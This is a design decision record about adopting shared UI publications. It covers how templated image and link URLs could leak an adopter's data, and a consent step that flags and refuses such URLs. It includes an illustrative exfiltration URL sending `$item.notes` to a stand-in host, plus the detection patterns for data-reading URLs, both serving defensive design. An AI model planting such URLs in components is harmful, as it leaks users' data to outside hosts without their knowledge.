# Adopting shows a publication's URLs and texts, and URLs that send the adopter's data wait for consent

Partly superseded by [adoption-capabilities](adoption-capabilities.md): what an adopted element may reach,
and how URL consent is kept.

Date: 2026-11-19. Related: [sharing](sharing.md), [content-addressed-construct](content-addressed-construct.md).
Issue #357.

`publish` shows the owner every literal text and URL the copy carries (its flags), but `adopt` showed the adopter
only the interface and the bindings. An element's URL is text with expressions filled in when it draws (an image's
`url`, a link's `url`), so a publication could carry `https://a.example/p.png?d=$item.notes`: once adopted and
bound to the adopter's own collection, every row's `notes` went to `a.example` in the image request each time the
list drew. Decision `sharing` says data never leaves with a publication; here it left on the adopter's side, and
`update_adoption` could bring such a URL in a later version without anyone seeing it.

Considered: stripping or rewriting such URLs (breaks honest uses, such as an image service keyed by a row's
field); proxying images through the pod (a client and server change, and the query still reaches the host);
showing them and asking. Taken: show everything, and ask for the ones that send data.

Decision: **`adopt` (with or without `dry_run`) and `update_adoption` answer the publication's `flags`, worked out
from its objects the way `publish` works them out for the owner (`flags_in`): each literal text and URL with its
element and pointer. A URL that reads data when drawn is flagged `reads_data` and is refused (`sends_data`, with
`data_urls`) unless the adopter's agent passes it, exactly, in `accept_data_urls` after the user agreed.** The
adoption records the URLs accepted; `update_adoption` refuses a version that brings one not accepted yet, the same
way.

- A URL reads data when it holds `$in.`, `$item.`, `$arg.` (an argument may carry either), `$form.`, `$route.`,
  `${…}` (an entity field) or `entity.` and either names a host (`http://`, `https://`) or, at a URL key (`url`,
  `src`, `href`, `image`, `…_url`), is put together from more than one expression. A URL that is wholly one
  expression (`$item.photo`) is the user's own value and goes nowhere the publication chose: not flagged.
- `flags_in` marks these for the owner's review too (`reads_data`), and now also flags a URL put together from
  expressions at a URL key; under `keep_shared` a new such URL holds the version for the owner's review as any new
  flag does.
- `fork` adoptions don't follow, so nothing is recorded for them. Adoptions made before this have no accepted
  URLs: their next update asks for any such URL the new version carries.
- The MCP tools `adopt` and `update_adoption` take a new parameter (`accept_data_urls`): a connector that cached
  the old tool list needs "Refresh tools list".

Not yet: a URL reaching data through a component's argument whose host is passed in another argument is caught
only where the pieces meet in one string; the review still lists every URL.
